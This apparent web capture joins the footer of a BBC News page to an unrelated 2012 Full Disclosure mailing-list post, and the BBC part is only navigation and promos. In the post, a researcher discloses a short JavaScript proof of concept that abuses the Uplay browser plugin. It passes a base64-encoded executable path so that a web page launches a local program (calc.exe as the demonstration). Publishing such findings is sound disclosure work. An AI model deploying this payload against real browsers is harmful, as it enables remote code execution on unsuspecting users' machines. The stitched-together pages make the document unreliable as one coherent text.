* [A GP under suspicion following an unexpected death](/sounds/play/m0022qsb?at_mid=0ND1n6JhjG&at_campaign=Assume_Nothing_A_Deadly_Diagnosis&at_medium=display_ad&at_campaign_type=owned&at_audience_id=SS&at_product=sounds&at_brand=m000psj8&at_ptr_name=bbc&at_ptr_type=media&at_format=image&at_objective=consumption&at_link_title=Assume_Nothing_A_Deadly_Diagnosis&at_bbc_team=BBC)

  The story of Dr Adams, who in 1957 found himself at the centre of 'the trial of the century'

  ![Assume Nothing: A Deadly Diagnosis](https://ichef.bbci.co.uk/ace/standard/480/cpsprodpb/2ddf/live/df977510-cad3-11ef-87df-d575b9a434a4.jpg)
* [An epic sequel starring Ryan Gosling and Harrison Ford](/iplayer/episode/m0012ygz/blade-runner-2049?at_mid=MealIhu4qU&at_campaign=Blade_Runner_2049&at_medium=display_ad&at_campaign_type=owned&at_audience_id=SS&at_product=iplayer&at_brand=m0012ygz&at_ptr_name=bbc&at_ptr_type=media&at_format=image&at_objective=consumption&at_link_title=Blade_Runner_2049&at_bbc_team=BBC)

  Acclaimed, Oscar-winning sci-fi from the director of Dune

  ![Blade Runner 2049](https://ichef.bbci.co.uk/ace/standard/480/cpsprodpb/9d99/live/dfe36140-d970-11ef-bc01-8f2c83dad217.jpg)
## Most read

1. 1[Trump revokes security protection for Covid adviser Fauci](/news/articles/cvg49jz7v8no)
2. 2[One dead and nearly a million without power in Storm Ãowyn](/news/articles/c78x4503neyo)
3. 3[Mum who left sons home alone jailed for fire deaths](/news/articles/c5ye7p34235o)
4. 4[Southport killer had ricin materials sent to neighbour](/news/articles/crke680m0npo)
5. 5[Marilyn Manson sexual assault investigation dropped by lawyers](/news/articles/cge7q0z5nz0o)
6. 6[Edinburgh becomes first 'tourist tax' city in Scotland](/news/articles/cz0l9xp5ldzo)
7. 7[Pie fortune heir jailed for Christmas Eve murder](/news/articles/cqx92gq4z40o)
8. 8[Would you make a good Traitor? Take our quiz](/news/articles/c0rqvp0zdl0o)
9. 9[Hamas names next Israeli hostages set to be released](/news/articles/c8xqv5rqpyjo)
10. 10[Bulgarian woman based in UK denies spying for Russia](/news/articles/cp9x0vvgj72o)
## BBC News Services

* [On your mobile](https://www.bbc.co.uk/news/10628994)
* [On smart speakers](https://www.bbc.co.uk/news/help-50068132)
* [Get news alerts](https://www.bbc.co.uk/news/10628323)
* [Contact BBC News](https://www.bbc.co.uk/news/20039682)

* [Home](https://www.bbc.com)
* [News](https://www.bbc.com/news)
* [Sport](https://www.bbc.com/sport)
* [Business](https://www.bbc.com/business)
* [Innovation](https://www.bbc.com/innovation)
* [Culture](https://www.bbc.com/culture)
* [Travel](https://www.bbc.com/travel)
* [Earth](https://www.bbc.com/future-planet)
* [Video](https://www.bbc.com/video)
* [Live](https://www.bbc.com/live)

* [Terms of Use](https://www.bbc.co.uk/usingthebbc/terms)
* [About the BBC](https://www.bbc.co.uk/aboutthebbc)
* [Privacy Policy](https://www.bbc.com/usingthebbc/privacy)
* [Cookies](https://www.bbc.com/usingthebbc/cookies)
* [Accessibility Help](https://www.bbc.co.uk/accessibility)
* [Parental Guidance](https://www.bbc.co.uk/iplayer/guidance)
* [Contact the BBC](https://www.bbc.co.uk/contact)
* [Get Personalised Newsletters](https://www.bbc.co.uk/bbcnewsletter)
* [Why you can trust the BBC](https://www.bbc.co.uk/news/help-41670342)
* [Advertise with us](https://www.bbc.com/advertisingcontact/)

Â© 2025 BBC. The BBC is not responsible for the content of external sites. [Read about our approach to external linking.](https://www.bbc.co.uk/editorialguidelines/guidance/feeds-and-links)



=== Content from seclists.org_c4be5a25_20250124_231812.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](374)
[By Date](date.html#375)
[![Next](/images/right-icon-16x16.png)](376)

[![Previous](/images/left-icon-16x16.png)](371)
[By Thread](index.html#375)
[![Next](/images/right-icon-16x16.png)](377)

![](/shared/images/nst-icons.svg#search)

# Re: AxMan ActiveX fuzzing <== Memory Corruption PoC

---

*From*: Tavis Ormandy <taviso () cmpxchg8b com>

*Date*: Sun, 29 Jul 2012 23:34:45 +0200

---

```
kaveh ghaemmaghami <kavehghaemmaghami () googlemail com> wrote:

```
> ```
> Exploit Title: AxMan ActiveX fuzzing <== Memory Corruption PoC Crash :
>
> ```

```
<snip nonsense>

Your silly post reminded me of something, while on vacation recently I
bought a video game called "Assassin's Creed Revelations". I didn't have
much of a chance to play it, but it seems fun so far. However, I noticed the
installation procedure creates a browser plugin for it's accompanying uplay
launcher, which grants unexpectedly (at least to me) wide access to
websites.

I don't know if it's by design, but I thought I'd mention it here in case
someone else wants to look into it (I'm not really interested in video game
security, I air-gap the machine I use to play games). A few minutes in IDA
suggests this might work (untested):

x = document.createElement('OBJECT');
x.type = "application/x-uplaypc";
document.body.appendChild(x);
x.open("-orbit_product_id 1 -orbit_exe_path
QzpcV0lORE9XU1xTWVNURU0zMlxDQUxDLkVYRQ== -uplay_steam_mode -uplay_dev_mode
-uplay_dev_mode_auto_play")

$ printf "C:\\WINDOWS\\SYSTEM32\\CALC.EXE" | base64
QzpcV0lORE9XU1xTWVNURU0zMlxDQUxDLkVYRQ==

If someone wants to investigate further, please feel free to do so.

Tavis.

--
-------------------------------------
taviso () cmpxchg8b com | pgp encrypted mail preferred
-------------------------------------------------------

_______________________________________________
Full-Disclosure - We believe in it.
Charter: <http://lists.grok.org.uk/full-disclosure-charter.html>
Hosted and sponsored by Secunia - <http://secunia.com/>

```

---

[![Previous](/images/left-icon-16x16.png)](374)
[By Date](date.html#375)
[![Next](/images/right-icon-16x16.png)](376)

[![Previous](/images/left-icon-16x16.png)](371)
[By Thread](index.html#375)
[![Next](/images/right-icon-16x16.png)](377)

### Current thread:

* [AxMan ActiveX fuzzing <== Memory Corruption PoC](371) *kaveh ghaemmaghami (Jul 28)*
  + **Re: AxMan ActiveX fuzzing <== Memory Corruption PoC** *Tavis Ormandy (Jul 29)*
  + [Re: AxMan ActiveX fuzzing <== Memory Corruption PoC](377) *kaveh ghaemmaghami (Jul 30)*
    - [Re: AxMan ActiveX fuzzing <== Memory Corruption PoC](379) *Benji (Jul 30)*
    - [Re: AxMan ActiveX fuzzing <== Memory Corruption PoC](383) *Thor (Hammer of God) (Jul 30)*
    - [Re: AxMan ActiveX fuzzing <== Memory Corruption PoC](390) *James Condron (Jul 31)*
      * [Re: AxMan ActiveX fuzzing <== Memory Corruption PoC](391) *Thor (Jul 31)** [Re: AxMan ActiveX fuzzing <== Memory Corruption PoC](392) *James Condron (Jul 31)*
  + [Re: AxMan ActiveX fuzzing <== Memory Corruption PoC](389) *HD Moore (Jul 31)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")


